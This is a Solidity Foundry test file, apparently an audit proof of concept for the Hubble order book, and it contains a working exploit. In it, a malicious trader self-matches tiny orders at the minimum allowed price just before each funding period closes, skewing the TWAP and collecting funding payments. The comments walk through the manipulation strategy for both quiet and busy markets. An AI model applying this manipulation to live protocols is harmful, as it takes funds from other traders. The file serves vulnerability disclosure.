// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import "./Utils.sol";
import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";

contract OrderBookTests is Utils {
    RestrictedErc20 public weth;
    int public constant defaultWethPrice = 1000 * 1e6;

    event OrderPlaced(address indexed trader, bytes32 indexed orderHash, IOrderBook.Order order, uint timestamp);
    event OrderCancelled(address indexed trader, bytes32 indexed orderHash, uint timestamp);
    event OrdersMatched(bytes32 indexed orderHash0, bytes32 indexed orderHash1, uint256 fillAmount, uint price, uint openInterestNotional, address relayer, uint timestamp);
    event LiquidationOrderMatched(address indexed trader, bytes32 indexed orderHash, uint256 fillAmount, uint price, uint openInterestNotional, address relayer, uint timestamp);

    function setUp() public {
        setupContracts();
        // add collateral
        weth = setupRestrictedTestToken('Hubble Ether', 'WETH', 18);

        vm.startPrank(governance);
        orderBook.setValidatorStatus(address(this), true);
        oracle.setUnderlyingPrice(address(weth), defaultWethPrice);
        marginAccount.whitelistCollateral(address(weth), 1e6);
        vm.stopPrank();
    }

    function testUserCanControlEmissions() public {
        uint256 price = 1e6;
        oracle.setUnderlyingPrice(address(wavax), int(uint(price)));

        // Calculate how much margin required for 100x MIN_SIZE
        uint256 marginRequired = orderBook.getRequiredMargin(100 * MIN_SIZE, price) * 1e18 / uint(defaultWethPrice) + 1e10; // required weth margin in 1e18, add 1e10 for any precision loss
        
        // Let's say Alice is our malicious user, and Bob is a normal user
        addMargin(alice, marginRequired, 1, address(weth));
        addMargin(bob, marginRequired, 1, address(weth));

        // Alice places a large legitimate long order that is matched with a short order from Bob
        placeAndExecuteOrder(0, aliceKey, bobKey, MIN_SIZE * 90, price, true, false, MIN_SIZE * 90, false);

        // Alice's free margin is now pretty low
        int256 availabeMargin = marginAccount.getAvailableMargin(alice);
        assertApproxEqRel(availabeMargin, 200410, 0.1e18); // Assert within 10%

        // Calculate what's the least we could fill an order for given the oracle price
        uint256 spreadLimit = amm.maxOracleSpreadRatio();
        uint minPrice = price * (1e6 - spreadLimit) / 1e6;

        // Alice can fill both sides of an order at the minimum fill price calculated above, with the minimum size
        // Alice would place such orders (and hopefully have them executed) just after anyone else makes an order in a period (1 hour)
        // The goal for Alice is to keep the perpetual TWAP as low as possible vs the oracle TWAP (since she holds a large long position)
        // In quiet market conditions Alice just has to make sure she's the last person to fill
        // In busy market conditions Alice would fill an order immediately after anyone else fills an order
        // In this test Alice fills an order every 2 periods, but in reality, if nobody was trading then Alice wouldn't have to do anything provided she was the last filler        
        for (uint i = 0; i < 100; i++) {
            uint256 currentPeriodStart = (block.timestamp / 1 hours) * 1 hours;

            // Warp to before the end of the period
            vm.warp(currentPeriodStart + 3590);
            
            // Place and execute both sides of an order as Alice
            // Alice can do this because once both sides of the order are executed, the effect to her free margin is 0
            // As mentioned above, Alice would place such orders every time after another order is executed
            placeAndExecuteOrder(0, aliceKey, aliceKey, MIN_SIZE, minPrice, true, false, MIN_SIZE, false);
            
            // Warp to the start of the next period
            vm.warp(currentPeriodStart + (3600 * 2) + 10);
            
            // Funding is settled. This calculates the premium emissions by comparing the perpetual twap with the oracle twap
            orderBook.settleFunding();
        }

        // Alice's margin is now significantly higher (after just 200 hours) because she's been pushing the premiums in her direction
        availabeMargin = marginAccount.getAvailableMargin(alice);
        assertApproxEqRel(availabeMargin, 716442910, 0.1e18); // Assert within 10%

    }
}